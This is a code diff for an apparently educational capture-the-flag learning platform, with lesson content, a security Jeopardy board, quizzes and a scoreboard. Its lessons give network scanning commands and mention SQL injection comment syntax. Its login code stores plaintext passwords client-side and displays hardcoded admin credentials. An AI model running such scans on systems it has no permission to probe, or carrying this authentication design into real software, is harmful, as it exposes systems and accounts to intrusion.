+  {id:6,title:"Network Fundamentals for Hackers",icon:"🕸️",category:"Network Security",summary:"Essential networking knowledge for ethical hacking.",points:["TCP/IP is the backbone protocol suite of the internet","OSI model: Physical, Data Link, Network, Transport, Session, Presentation, Application","IP addresses identify hosts; ports identify services","Well-known ports: 21(FTP), 22(SSH), 25(SMTP), 53(DNS), 80(HTTP), 443(HTTPS)","Nmap is the standard tool for network scanning and enumeration","TCP three-way handshake: SYN → SYN-ACK → ACK","UDP is connectionless — faster but no reliability guarantees","Subnetting divides networks into smaller segments","NAT hides internal IP addresses behind a public IP","Firewalls filter traffic based on rules (stateful vs stateless)","IDS detects attacks; IPS can block them","VLANs segment networks at Layer 2","Routing directs packets between networks","ARP maps IP addresses to MAC addresses (Layer 2)","DNS resolution: query → recursive resolver → root → TLD → authoritative"],examples:["Nmap basic scan: nmap -sV -sC 10.0.0.0/24","Check open ports: nmap -p 1-65535 target_ip","Identify OS: nmap -O target_ip"],challenges:["Port Protocol Puzzle","PCAP Secrets","Network Map Pivot"]},
+  {id:7,title:"Data Security & Privacy",icon:"🔒",category:"Data Security",summary:"Protecting data at rest, in transit, and in use.",points:["Data classification: Public, Internal, Confidential, Restricted","Encryption at rest protects stored data (AES-256 for databases)","Encryption in transit protects data moving over networks (TLS)","Access control: Authentication (who are you?) + Authorisation (what can you do?)","RBAC: Role-Based Access Control — assign permissions to roles, not individuals","Principle of least privilege: only minimum necessary access","Data masking hides sensitive fields in non-production environments","Tokenisation replaces sensitive data with non-sensitive tokens","GDPR requires data minimisation and right to erasure","Data retention policies determine how long data is kept","Secure deletion: overwrite or cryptographically erase","Backup encryption is often overlooked but critical","Database activity monitoring tracks who queries what","Sensitive data discovery tools identify where PII is stored","Data loss prevention (DLP) tools prevent unauthorised data exfiltration"],examples:["AES-256 encrypting a database column: ENCRYPT(ssn, 'key')","RBAC: User in 'read-only' role cannot write to database","GDPR: User requests deletion → all PII must be removed within 30 days"],challenges:["Hashing vs Plaintext","Backup Exposure","IDOR Logic Flaw"]},
+  {id:8,title:"Reverse Engineering Basics",icon:"⚙️",category:"Reverse Engineering",summary:"Introduction to safely analysing compiled programs.",points:["Reverse engineering analyses software to understand its functionality","Static analysis: examining code without running it","Dynamic analysis: running code in a controlled environment (sandbox)","'strings' command extracts human-readable text from binaries","Disassemblers convert machine code to assembly (e.g., Ghidra, IDA)","Decompilers attempt to reconstruct source code from binaries","XOR is the most common obfuscation technique in malware","Packed binaries use compression to hide code (UPX packer)","Entry point: where program execution starts","System calls reveal what a program does (strace on Linux)","API monitoring on Windows (Process Monitor, API Monitor)","Safe RE environments: VMs, isolated networks, no real credentials","Strings in binaries often reveal: hardcoded passwords, URLs, debug info","Symbol stripping removes function names from production builds","Ethical RE: only reverse software you own or have permission to analyse"],examples:["strings suspicious.exe | grep -i 'flag|key|password'","XOR decode: 0x41 XOR 0x20 = 0x61 ('A' XOR space = 'a')","strace ./program 2>&1 | grep 'open|read|write'"],challenges:["String Extraction","Advanced Crackme"]},
+  {id:9,title:"Incident Response Basics",icon:"🚨",category:"Network Security",summary:"How to identify, contain, and recover from security incidents.",points:["NIST IR process: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned","Indicators of Compromise (IoCs): suspicious IPs, file hashes, domains","First responder priority: preserve evidence before remediation","Chain of custody: documented handling of forensic evidence","Memory forensics: volatile data (RAM) lost on shutdown — capture first","Disk imaging: bit-for-bit copy before any analysis","Log analysis: system logs, auth logs, network logs, application logs","SIEM (Security Information and Event Management) correlates logs","Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR) are key metrics","Tabletop exercises test response plans without real incidents","Ransomware response: isolate, identify variant, restore from backup","Data breach notification requirements vary by jurisdiction (GDPR: 72 hours)","Post-incident report should identify root cause and lessons learned","Threat hunting proactively searches for hidden attackers","Zero-trust architecture assumes breach and verifies everything"],examples:["Check auth logs: grep 'Failed password' /var/log/auth.log","List recent logins: last | head -20","Check listening services: ss -tulpn"],challenges:["Network Map Pivot","PCAP Secrets"]},
+];
+
+const JEOPARDY_DATA = {
+  categories: ["Web Security","Cryptography","Networking","Linux CLI","OWASP","Incident Basics"],
+  questions: {
+    "Web Security": [{pts:100,q:"What does XSS stand for?",a:"Cross-Site Scripting"},{pts:200,q:"Which SQL payload comments out the rest of a query in MySQL?",a:"-- or #"},{pts:300,q:"What attack forges requests from a trusted user's browser?",a:"CSRF (Cross-Site Request Forgery)"},{pts:400,q:"What does IDOR stand for?",a:"Insecure Direct Object Reference"},{pts:500,q:"Name the OWASP 2021 #1 vulnerability.",a:"Broken Access Control"}],
+    "Cryptography": [{pts:100,q:"What does RSA stand for?",a:"Rivest–Shamir–Adleman"},{pts:200,q:"What is the difference between encoding and encryption?",a:"Encoding has no key; encryption requires a key"},{pts:300,q:"Which hashing algorithm is recommended for passwords?",a:"bcrypt or Argon2"},{pts:400,q:"What is a 'salt' used for in password hashing?",a:"To prevent rainbow table attacks by adding random data"},{pts:500,q:"What property ensures past sessions can't be decrypted if the key is compromised?",a:"Perfect Forward Secrecy"}],
+    "Networking": [{pts:100,q:"What port does SSH use by default?",a:"22"},{pts:200,q:"What protocol resolves domain names to IP addresses?",a:"DNS"},{pts:300,q:"What does ARP stand for and what does it do?",a:"Address Resolution Protocol — maps IP to MAC address"},{pts:400,q:"Name two differences between TCP and UDP.",a:"TCP is connection-oriented/reliable; UDP is connectionless/faster"},{pts:500,q:"What is a VLAN and why is it used?",a:"Virtual LAN — segments network at Layer 2 for isolation"}],
+    "Linux CLI": [{pts:100,q:"What command lists files in a directory?",a:"ls"},{pts:200,q:"Which command shows listening network ports?",a:"ss -tulpn or netstat -tulpn"},{pts:300,q:"How do you search for a string in files recursively?",a:"grep -r 'string' /path"},{pts:400,q:"What command shows running processes?",a:"ps aux or top"},{pts:500,q:"How do you make a file executable and then run it?",a:"chmod +x file.sh && ./file.sh"}],
+    "OWASP": [{pts:100,q:"What does OWASP stand for?",a:"Open Worldwide Application Security Project"},{pts:200,q:"What is A02:2021 in the OWASP Top 10?",a:"Cryptographic Failures"},{pts:300,q:"What is security misconfiguration (A05)?",a:"Default configs, unnecessary features, open cloud storage, etc."},{pts:400,q:"What is A08:2021 - Software and Data Integrity Failures?",a:"Assumptions about integrity of software updates, CI/CD pipeline"},{pts:500,q:"What is SSRF and which OWASP category is it?",a:"Server-Side Request Forgery — A10:2021"}],
+    "Incident Basics": [{pts:100,q:"What is an IoC?",a:"Indicator of Compromise"},{pts:200,q:"List the NIST IR phases in order.",a:"Preparation, Detection, Containment, Eradication, Recovery, Lessons Learned"},{pts:300,q:"What is volatile data and why must it be captured first?",a:"RAM contents — lost on shutdown; contains running processes, passwords"},{pts:400,q:"Under GDPR, how quickly must a breach be reported?",a:"Within 72 hours"},{pts:500,q:"What is threat hunting?",a:"Proactively searching for hidden threats that evaded existing controls"}],
+  }
+};
+
+// ============================================================
+// STATE
+// ============================================================
+let STATE = {
+  users: [
+    {id:1,username:"admin",password:"admin123",role:"admin",points:0,solves:[]},
+    {id:2,username:"demo",password:"demo123",role:"student",points:475,solves:[1,2,4,5,6,9]},
+  ],
+  currentUser: null,
+  challenges: JSON.parse(JSON.stringify(INITIAL_CHALLENGES)),
+  quizResults: {},
+  jeopardy: {solved:{}, teamPoints:0},
+  page: "learn",
+  // challenge detail state
+  selectedChallenge: null,
+  challengeFilter: {cat:"All",diff:"All"},
+  flagInput: "",
+  flagResult: null,
+  showHint: false,
+  // learn
+  selectedLearn: null,
+  // quiz
+  activeQuiz: null,
+  quizIdx: 0,
+  quizAnswers: {},
+  quizSubmitted: false,
+  // admin
+  adminTab: "challenges",
+  editingChallenge: null,
+  editForm: {},
+  confirmReset: false,
+};
+
+// ============================================================
+// HELPERS
+// ============================================================
+const G = {accent:"#00d4ff",accent2:"#7c3aed",green:"#00ff88",red:"#ff4466",yellow:"#ffd700",muted:"#64748b",text:"#e2e8f0"};
+const diffColor = {Beginner:G.green,Intermediate:G.yellow,Advanced:G.red};
+const catEmoji = {"Web Hacking":"🌐","Cryptography":"🔐","Network Security":"📡","Data Security":"🔒","Reverse Engineering":"⚙️","Social Engineering":"🎭"};
+
+function esc(str) {
+  return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;");
+}
+function badge(text, color) {
+  return `<span class="badge" style="background:${color}22;color:${color};border:1px solid ${color}44">${esc(text)}</span>`;
+}
+
+// ============================================================
+// AUTH
+// ============================================================
+function login(username, password) {
+  const user = STATE.users.find(u => u.username===username && u.password===password);
+  if (user) { STATE.currentUser = {...user}; render(); return true; }
+  return false;
+}
+function logout() { STATE.currentUser = null; STATE.page = "learn"; render(); }
+function register(username, password) {
+  if (STATE.users.find(u=>u.username===username)) return false;
+  const newUser = {id:Date.now(),username,password,role:"student",points:0,solves:[]};
+  STATE.users.push(newUser);
+  STATE.currentUser = {...newUser};
+  render();
+  return true;
+}
+
+// ============================================================
+// GAME LOGIC
+// ============================================================
+function submitFlag(challengeId, flagInput) {
+  const ch = STATE.challenges.find(c=>c.id===challengeId);
+  if (!ch || !STATE.currentUser) return {success:false,msg:"Not found"};
+  if (STATE.currentUser.solves?.includes(challengeId)) return {success:false,msg:"Already solved!"};
+  if (flagInput.trim().toLowerCase()===ch.flag.toLowerCase()) {
+    const newSolves = [...(STATE.currentUser.solves||[]),challengeId];
+    const newPoints = (STATE.currentUser.points||0)+ch.points;
+    STATE.currentUser = {...STATE.currentUser,solves:newSolves,points:newPoints};
+    STATE.users = STATE.users.map(u=>u.id===STATE.currentUser.id?{...u,solves:newSolves,points:newPoints}:u);
+    return {success:true,msg:`+${ch.points} points! 🎉`,explanation:ch.explanation};
+  }
+  return {success:false,msg:"Wrong flag. Try again!"};
+}
+function saveQuizResult(quizId, score, total) {
+  STATE.quizResults[quizId] = {score,total,pct:Math.round(score/total*100)};
+  if (STATE.currentUser && score===total) {
+    const bonus = 50;
+    STATE.currentUser = {...STATE.currentUser,points:(STATE.currentUser.points||0)+bonus};
+    STATE.users = STATE.users.map(u=>u.id===STATE.currentUser.id?{...u,points:(u.points||0)+bonus}:u);
+  }
+}
+function resetScoreboard() {
+  STATE.users = STATE.users.map(u=>({...u,points:0,solves:[]}));
+  if (STATE.currentUser) STATE.currentUser = {...STATE.currentUser,points:0,solves:[]};
+  STATE.quizResults = {};
+  STATE.jeopardy = {solved:{},teamPoints:0};
+}
+
+// ============================================================
+// NAVIGATION
+// ============================================================
+function navigate(page) {
+  STATE.page = page;
+  STATE.selectedChallenge = null;
+  STATE.selectedLearn = null;
+  render();
+}
+function closeModal(e) {
+  document.getElementById('modal').classList.add('hidden');
+}
+
+// ============================================================
+// RENDER ENTRY
+// ============================================================
+function render() {
+  renderNav();
+  const pages = ["auth","learn","challenges","jeopardy","quizzes","scoreboard","admin"];
+  pages.forEach(p => {
+    const el = document.getElementById('page-'+p);
+    if (el) el.classList.add('hidden');
+  });
+
+  if (!STATE.currentUser) {
+    document.getElementById('page-auth').classList.remove('hidden');
+    renderAuth();
+    return;
+  }
+  const p = STATE.page;
+  const el = document.getElementById('page-'+p);
+  if (el) el.classList.remove('hidden');
+
+  if (p==='learn') renderLearn();
+  else if (p==='challenges') renderChallenges();
+  else if (p==='jeopardy') renderJeopardy();
+  else if (p==='quizzes') renderQuizzes();
+  else if (p==='scoreboard') renderScoreboard();
+  else if (p==='admin' && STATE.currentUser.role==='admin') renderAdmin();
+}
+
+// ============================================================
+// NAV
+// ============================================================
+function renderNav() {
+  const links = document.getElementById('nav-links');
+  const userDiv = document.getElementById('nav-user');
+  if (!STATE.currentUser) { links.innerHTML=''; userDiv.classList.add('hidden'); return; }
+  userDiv.classList.remove('hidden');
+  document.getElementById('nav-pts').textContent = `⚡ ${STATE.currentUser.points||0} pts`;
+  document.getElementById('nav-uname').textContent = STATE.currentUser.username;
+  const navItems = [{id:"learn",label:"📚 LEARN"},{id:"challenges",label:"⚡ CHALLENGES"},{id:"jeopardy",label:"🎯 JEOPARDY"},{id:"quizzes",label:"📝 QUIZZES"},{id:"scoreboard",label:"🏆 SCOREBOARD"}];
+  if (STATE.currentUser.role==='admin') navItems.push({id:"admin",label:"⚙️ ADMIN"});
+  links.innerHTML = navItems.map(n=>`<button class="nav-btn${STATE.page===n.id?' active':''}" onclick="navigate('${n.id}')">${n.label}</button>`).join('');
+}
+
+// ============================================================
+// AUTH PAGE
+// ============================================================
+function renderAuth() {
+  document.getElementById('page-auth').innerHTML = `
+    <div id="auth-wrap">
+      <div class="card" id="auth-card">
+        <div id="auth-logo">🛡️</div>
+        <h2 id="auth-title">UTECH CTF HUB</h2>
+        <p id="auth-sub">Ethical Hacking Learning Platform</p>
+        <div id="auth-toggle">
+          <button id="btn-login" class="btn-fill" onclick="setAuthMode('login')">LOGIN</button>
+          <button id="btn-register" class="btn" onclick="setAuthMode('register')">REGISTER</button>
+        </div>
+        <input class="inp mb08" id="auth-user" placeholder="Username" />
+        <input class="inp mb1" id="auth-pass" type="password" placeholder="Password" onkeydown="if(event.key==='Enter')authSubmit()" />
+        <p id="auth-error" style="color:var(--red);font-size:.85rem;margin-bottom:.8rem;min-height:1.2em"></p>
+        <button class="btn-fill" style="width:100%" id="auth-submit-btn" onclick="authSubmit()">LOGIN</button>
+        <p id="auth-hint">Demo: demo / demo123 &nbsp;|&nbsp; Admin: admin / admin123</p>
+      </div>
+    </div>`;
+  window._authMode = 'login';
+}
+function setAuthMode(mode) {
+  window._authMode = mode;
+  document.getElementById('btn-login').className = mode==='login'?'btn-fill':'btn';
+  document.getElementById('btn-register').className = mode==='register'?'btn-fill':'btn';
+  document.getElementById('auth-submit-btn').textContent = mode==='login'?'LOGIN':'REGISTER';
+  document.getElementById('auth-error').textContent = '';
+}
+function authSubmit() {
+  const u = document.getElementById('auth-user').value.trim();
+  const p = document.getElementById('auth-pass').value;
+  const errEl = document.getElementById('auth-error');
+  if (!u||!p) { errEl.textContent='Fill in all fields'; return; }
+  if (window._authMode==='login') {
+    if (!login(u,p)) errEl.textContent='Invalid credentials';
+  } else {
+    if (!register(u,p)) errEl.textContent='Username already taken';
+  }
+}
+
+// ============================================================
+// LEARN PAGE
+// ============================================================
+function renderLearn() {
+  const el = document.getElementById('page-learn');
+  if (STATE.selectedLearn !== null) {
+    const t = LEARN_TOPICS.find(x=>x.id===STATE.selectedLearn);
+    el.innerHTML = `<div class="page">
+      <button class="btn mb15" onclick="STATE.selectedLearn=null;renderLearn()">← BACK</button>
+      <div class="card">
+        <div class="flex-row mb15">
+          <span style="font-size:2.5rem">${t.icon}</span>
+          <div><h2 style="color:var(--accent);margin:0">${esc(t.title)}</h2>${badge(t.category,G.accent2)}</div>
+        </div>
+        <p style="color:var(--muted);margin-bottom:1.5rem">${esc(t.summary)}</p>
+        <h3 style="color:var(--yellow);margin-bottom:1rem">📋 Key Learning Points</h3>
+        <ul style="list-style:none;padding:0;margin:0 0 1.5rem 0">
+          ${t.points.map((p,i)=>`<li class="point-item"><span class="point-num">${String(i+1).padStart(2,'0')}.</span><span>${esc(p)}</span></li>`).join('')}
+        </ul>
+        <h3 style="color:var(--yellow);margin-bottom:1rem">💡 Mini Examples</h3>
+        ${t.examples.map(ex=>`<div class="code-block">${esc(ex)}</div>`).join('')}
+        <h3 style="color:var(--yellow);margin:1.5rem 0 1rem">🎯 Recommended Challenges</h3>
+        <div class="flex-row">${t.challenges.map(c=>badge(c,G.accent)).join('')}</div>
+      </div>
+    </div>`;
+    return;
+  }
+  el.innerHTML = `<div class="page">
+    <h1 class="page-title">📚 LEARN</h1>
+    <p class="page-sub">Build your knowledge before tackling challenges</p>
+    <div class="learn-grid">
+      ${LEARN_TOPICS.map(t=>`
+        <div class="card learn-card" onclick="STATE.selectedLearn=${t.id};renderLearn()">
+          <div class="flex-between mb08">
+            <span style="font-size:2rem">${t.icon}</span>
+            ${badge(t.category,G.accent2)}
+          </div>
+          <h3 style="color:var(--text);margin:0 0 .5rem">${esc(t.title)}</h3>
+          <p style="color:var(--muted);font-size:.85rem;margin:0 0 1rem">${esc(t.summary)}</p>
+          <div style="font-size:.8rem;color:var(--muted)">${t.points.length} learning points • ${t.examples.length} examples</div>
+        </div>`).join('')}
+    </div>
+  </div>`;
+}
+
+// ============================================================
+// CHALLENGES PAGE
+// ============================================================
+function renderChallenges() {
+  const el = document.getElementById('page-challenges');
+  if (STATE.selectedChallenge !== null) {
+    renderChallengeDetail(el);
+    return;
+  }
+  const cats = ["All",...[...new Set(STATE.challenges.map(c=>c.category))]];
+  const diffs = ["All","Beginner","Intermediate","Advanced"];
+  const {cat,diff} = STATE.challengeFilter;
+  const filtered = STATE.challenges.filter(c=>c.enabled&&(cat==="All"||c.category===cat)&&(diff==="All"||c.difficulty===diff));
+
+  const groups = ["Beginner","Intermediate","Advanced"].map(d=>{
+    const group = filtered.filter(c=>c.difficulty===d);
+    if (!group.length) return '';
+    const icon = d==="Beginner"?"🟢":d==="Intermediate"?"🟡":"🔴";
+    return `<div style="margin-bottom:2rem">
+      <h2 class="diff-section-title" style="color:${diffColor[d]}">${icon} ${d.toUpperCase()}</h2>
+      <div class="ch-grid">
+        ${group.map(ch=>{
+          const solved = STATE.currentUser?.solves?.includes(ch.id);
+          return `<div class="card ch-card ${solved?'ch-solved':''}" onclick="openChallenge(${ch.id})">
+            ${solved?`<div style="position:absolute;top:.8rem;right:.8rem;color:var(--green);font-size:1.2rem">✓</div>`:''}
+            <div class="flex-row mb08">${badge(ch.category,G.accent2)}${badge(ch.points+' pts',G.yellow)}</div>
+            <h3 style="margin:0 0 .5rem;color:var(--text);font-size:1rem">${catEmoji[ch.category]||'🔍'} ${esc(ch.title)}</h3>
+            <p style="color:var(--muted);font-size:.8rem;margin:0;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical">${esc(ch.description.substring(0,100))}...</p>
+          </div>`;
+        }).join('')}
+      </div>
+    </div>`;
+  }).join('');
+
+  el.innerHTML = `<div class="page">
+    <h1 class="page-title">⚡ CHALLENGES</h1>
+    <p style="color:var(--muted);margin-bottom:1.5rem">Solve CTF challenges across multiple categories</p>
+    <div class="flex-row mb2">
+      <select class="inp" style="width:auto" onchange="STATE.challengeFilter.cat=this.value;renderChallenges()">
+        ${cats.map(c=>`<option${c===cat?' selected':''}>${esc(c)}</option>`).join('')}
+      </select>
+      <select class="inp" style="width:auto" onchange="STATE.challengeFilter.diff=this.value;renderChallenges()">
+        ${diffs.map(d=>`<option${d===diff?' selected':''}>${d}</option>`).join('')}
+      </select>
+      <span style="color:var(--muted);font-size:.85rem">${filtered.length} challenges</span>
+    </div>
+    ${groups}
+  </div>`;
+}
+function openChallenge(id) {
+  STATE.selectedChallenge = id;
+  STATE.flagInput = '';
+  STATE.flagResult = null;
+  STATE.showHint = false;
+  renderChallenges();
+}
+function renderChallengeDetail(el) {
+  const ch = STATE.challenges.find(c=>c.id===STATE.selectedChallenge);
+  const solved = STATE.currentUser?.solves?.includes(ch.id);
+  const res = STATE.flagResult;
+  el.innerHTML = `<div class="page">
+    <button class="btn mb15" onclick="STATE.selectedChallenge=null;renderChallenges()">← BACK</button>
+    <div class="card">
+      <div class="flex-row mb15">
+        <span style="font-size:1.5rem">${catEmoji[ch.category]||'🔍'}</span>
+        <h2 style="margin:0;color:var(--accent)">${esc(ch.title)}</h2>
+        ${badge(ch.category,G.accent2)}
+        ${badge(ch.difficulty,diffColor[ch.difficulty])}
+        ${badge(ch.points+' pts',G.yellow)}
+        ${solved?badge('✓ SOLVED',G.green):''}
+      </div>
+      <div class="desc-box">${esc(ch.description)}</div>
+      ${!solved?`
+        <div class="flag-row">
+          <input class="inp" id="flag-inp" placeholder="flag{...}" value="${esc(STATE.flagInput)}" oninput="STATE.flagInput=this.value" onkeydown="if(event.key==='Enter')doSubmitFlag()" />
+          <button class="btn-fill" onclick="doSubmitFlag()">SUBMIT FLAG</button>
+          <button class="btn btn-yellow" onclick="toggleHint()">💡 HINT</button>
+        </div>
+        ${STATE.showHint?`<div class="hint-box mb1">💡 ${esc(ch.hint)}</div>`:''}
+        ${res?`<div class="result-box ${res.success?'result-ok':'result-err'}">${res.success?'✅':'❌'} ${esc(res.msg)}</div>`:''}
+      `:`<div class="result-box result-ok">✅ Challenge Solved!</div>`}
+      ${(res?.success||solved)?`<div class="learn-box"><h3 style="color:var(--yellow);margin-bottom:.8rem">📖 What You Learned</h3><p style="color:var(--text);line-height:1.7;font-size:.9rem">${esc(ch.explanation)}</p></div>`:''}
+    </div>
+  </div>`;
+}
+function doSubmitFlag() {
+  const inp = document.getElementById('flag-inp');
+  if (inp) STATE.flagInput = inp.value;
+  STATE.flagResult = submitFlag(STATE.selectedChallenge, STATE.flagInput);
+  renderChallenges();
+}
+function toggleHint() {
+  STATE.showHint = !STATE.showHint;
+  renderChallenges();
+}
+
+// ============================================================
+// SCOREBOARD
+// ============================================================
+function renderScoreboard() {
+  const ranked = [...STATE.users].sort((a,b)=>(b.points||0)-(a.points||0));
+  const medals = ["🥇","🥈","🥉"];
+  const rows = ranked.map((u,i)=>{
+    const badges = [];
+    if(u.solves?.some(id=>INITIAL_CHALLENGES.find(c=>c.id===id&&c.category==="Cryptography"))) badges.push("🔐 Crypto");
+    if(u.solves?.some(id=>INITIAL_CHALLENGES.find(c=>c.id===id&&c.category==="Web Hacking"))) badges.push("🌐 Web");
+    if((u.points||0)>=200) badges.push("⭐ Rising Star");
+    if((u.solves?.length||0)>=5) badges.push("🏅 5-Solve");
+    return `<tr style="border-bottom:1px solid var(--border);${i===0?'background:rgba(255,215,0,.03)':''}">
+      <td class="sb-table" style="padding:1rem .8rem;font-size:1.2rem">${medals[i]||'#'+(i+1)}</td>
+      <td style="padding:1rem .8rem;color:${i===0?G.yellow:G.text};font-weight:${i<3?'bold':'normal'}">${esc(u.username)}</td>
+      <td style="padding:1rem .8rem;color:var(--accent);font-weight:bold">${u.points||0}</td>
+      <td style="padding:1rem .8rem;color:var(--muted)">${u.solves?.length||0}</td>
+      <td style="padding:1rem .8rem">${badges.map(b=>badge(b,G.accent2)).join(' ')}</td>
+    </tr>`;
+  }).join('');
+  document.getElementById('page-scoreboard').innerHTML = `<div class="page">
+    <h1 class="page-title">🏆 SCOREBOARD</h1>
+    <p class="page-sub">Top hackers on the platform</p>
+    <div class="card">
+      <table class="sb-table">
+        <thead><tr style="border-bottom:2px solid var(--border)">
+          ${["Rank","Player","Points","Solves","Badges"].map(h=>`<th>${h}</th>`).join('')}
+        </tr></thead>
+        <tbody>${rows}</tbody>
+      </table>
+    </div>
+  </div>`;
+}
+
+// ============================================================
+// JEOPARDY
+// ============================================================
+function renderJeopardy() {
+  const {solved, teamPoints} = STATE.jeopardy;
+  const pts = [100,200,300,400,500];
+  const headerRow = JEOPARDY_DATA.categories.map(c=>`<th>${esc(c.toUpperCase())}</th>`).join('');
+  const bodyRows = pts.map(p=>`<tr>${JEOPARDY_DATA.categories.map(cat=>{
+    const key=`${cat}_${p}`;
+    const isSolved=solved[key];
+    return `<td style="border:2px solid var(--bg);padding:0">
+      <div class="j-tile${isSolved?' solved':''}" onclick="${isSolved?'':'openJeopardyQ(\''+cat.replace(/'/g,"\\'")+"',"+p+")"}">
+        ${isSolved?'✓':p}
+      </div></td>`;
+  }).join('')}</tr>`).join('');
+
+  document.getElementById('page-jeopardy').innerHTML = `<div class="page">
+    <div class="flex-between mb2" style="flex-wrap:wrap;gap:1rem">
+      <div>
+        <h1 style="color:var(--accent);letter-spacing:3px;margin:0">🎯 JEOPARDY</h1>
+        <p style="color:var(--muted);margin:.3rem 0 0">Click a tile to answer — earn points!</p>
+      </div>
+      <div class="card" style="padding:1rem 2rem;text-align:center">
+        <div class="jep-pts">${teamPoints}</div>
+        <div style="color:var(--muted);font-size:.8rem">TEAM POINTS</div>
+      </div>
+    </div>
+    <div style="overflow-x:auto">
+      <table class="jeopardy-table"><thead><tr>${headerRow}</tr></thead><tbody>${bodyRows}</tbody></table>
+    </div>
+  </div>`;
+}
+function openJeopardyQ(cat, p) {
+  const q = JEOPARDY_DATA.questions[cat]?.find(x=>x.pts===p);
+  if (!q) return;
+  const modal = document.getElementById('modal');
+  document.getElementById('modal-inner').innerHTML = `
+    <div class="flex-between mb1">${badge(cat,G.accent2)}${badge(p+' points',G.yellow)}</div>
+    <p style="font-size:1.1rem;line-height:1.7;margin-bottom:1.5rem">${esc(q.q)}</p>
+    <input class="inp mb08" id="jep-ans" placeholder="Your answer..." onkeydown="if(event.key==='Enter')submitJeopardy('${cat.replace(/'/g,"\\'")}',${p},'${esc(q.a).replace(/'/g,"\\'")}')"/>
+    <div class="flex-row">
+      <button class="btn-fill" onclick="submitJeopardy('${cat.replace(/'/g,"\\'")}',${p},'${q.a.replace(/'/g,"\\'")}')">SUBMIT &amp; REVEAL</button>
+      <button class="btn btn-muted" onclick="closeModal()">CANCEL</button>
+    </div>`;
+  modal.classList.remove('hidden');
+}
+function submitJeopardy(cat, p, answer) {
+  const key = `${cat}_${p}`;
+  STATE.jeopardy.solved[key] = true;
+  STATE.jeopardy.teamPoints = (STATE.jeopardy.teamPoints||0)+p;
+  document.getElementById('modal-inner').innerHTML = `
+    <div style="background:rgba(0,255,136,.07);border:1px solid rgba(0,255,136,.3);border-radius:4px;padding:1rem;margin-bottom:1rem">
+      <div style="color:var(--green);font-weight:bold;margin-bottom:.3rem">✅ Answer Revealed</div>
+      <div style="color:var(--text);font-family:monospace">${esc(answer)}</div>
+    </div>
+    <button class="btn-fill btn-fill-green" onclick="closeJeopardyModal(${p})">CLOSE (+${p} pts)</button>`;
+}
+function closeJeopardyModal(pts) {
+  document.getElementById('modal').classList.add('hidden');
+  renderJeopardy();
+}
+function closeModal(e) {
+  if (!e || e.target===document.getElementById('modal'))
+    document.getElementById('modal').classList.add('hidden');
+}
+document.getElementById('modal').addEventListener('click', closeModal);
+
+// ============================================================
+// QUIZZES
+// ============================================================
+function renderQuizzes() {
+  const el = document.getElementById('page-quizzes');
+  const {activeQuiz, quizIdx, quizAnswers, quizSubmitted} = STATE;
+
+  if (activeQuiz && !quizSubmitted) {
+    const q = activeQuiz.questions[quizIdx];
+    const prog = Math.round((quizIdx/activeQuiz.questions.length)*100);
+    el.innerHTML = `<div class="page">
+      <div class="flex-between mb15">
+        <h2 style="color:var(--accent);margin:0">${esc(activeQuiz.title)}</h2>
+        <span style="color:var(--muted);font-size:.9rem">${quizIdx+1} / ${activeQuiz.questions.length}</span>
+      </div>
+      <div class="progress-bar-bg"><div class="progress-bar-fill" style="width:${prog}%"></div></div>
+      <div class="card">
+        <p style="font-size:1.05rem;font-weight:bold;margin-bottom:1.5rem;line-height:1.5">${esc(q.q)}</p>
+        <div>
+          ${q.options.map((opt,i)=>`<div class="quiz-option${quizAnswers[quizIdx]===i?' selected':''}" onclick="selectQuizAnswer(${i})">
+            <span class="quiz-opt-letter">${["A","B","C","D"][i]}.</span>
+            <span>${esc(opt)}</span>
+          </div>`).join('')}
+        </div>
+        <div class="flex-row mt15" style="justify-content:flex-end">
+          ${quizIdx>0?`<button class="btn" onclick="quizNav(-1)">← PREV</button>`:''}
+          ${quizIdx<activeQuiz.questions.length-1
+            ?`<button class="btn-fill" onclick="quizNav(1)" ${quizAnswers[quizIdx]===undefined?'disabled':''}>NEXT →</button>`
+            :`<button class="btn-fill btn-fill-green" onclick="submitQuiz()" ${Object.keys(quizAnswers).length<activeQuiz.questions.length?'disabled':''}>SUBMIT QUIZ</button>`}
+        </div>
+      </div>
+    </div>`;
+    return;
+  }
+
+  if (activeQuiz && quizSubmitted) {
+    const {questions} = activeQuiz;
+    const score = questions.filter((q,i)=>quizAnswers[i]===q.correct).length;
+    const pct = Math.round(score/questions.length*100);
+    el.innerHTML = `<div class="page">
+      <div class="card mb2" style="text-align:center">
+        <div style="font-size:4rem;margin-bottom:1rem">${pct===100?"🎉":pct>=70?"👍":"📚"}</div>
+        <h2 style="color:${pct>=70?'var(--green)':'var(--yellow)'};letter-spacing:2px">${pct}% — ${score}/${questions.length} Correct</h2>
+        ${pct===100?`<p style="color:var(--green)">+50 bonus points for perfect score!</p>`:''}
+      </div>
+      <div>
+        ${questions.map((q,i)=>{
+          const correct = quizAnswers[i]===q.correct;
+          return `<div class="card mb1" style="border-color:${correct?'var(--green)':'var(--red)'}">
+            <p style="font-weight:bold;margin-bottom:.8rem">${i+1}. ${esc(q.q)}</p>
+            ${q.options.map((opt,j)=>`<div style="padding:.4rem .8rem;border-radius:3px;margin-bottom:.3rem;font-size:.9rem;
+              background:${j===q.correct?'rgba(0,255,136,.13)':j===quizAnswers[i]&&!correct?'rgba(255,68,102,.13)':'transparent'};
+              color:${j===q.correct?'var(--green)':j===quizAnswers[i]&&!correct?'var(--red)':'var(--muted)'}">
+              ${["A","B","C","D"][j]}. ${esc(opt)} ${j===q.correct?'✓':''}
+            </div>`).join('')}
+          </div>`;
+        }).join('')}
+      </div>
+      <button class="btn-fill mt15" onclick="STATE.activeQuiz=null;renderQuizzes()">← BACK TO QUIZZES</button>
+    </div>`;
+    return;
+  }
+
+  el.innerHTML = `<div class="page">
+    <h1 class="page-title">📝 QUIZZES</h1>
+    <p class="page-sub">Test your knowledge — perfect score earns +50 bonus points!</p>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1rem">
+      ${INITIAL_QUIZZES.map(quiz=>{
+        const res = STATE.quizResults[quiz.id];
+        return `<div class="card" style="display:flex;flex-direction:column;gap:.8rem">
+          <div class="flex-between">
+            <h3 style="margin:0;color:var(--text)">${esc(quiz.title)}</h3>
+            ${res?badge(res.pct+'%', res.pct>=70?G.green:G.yellow):''}
+          </div>
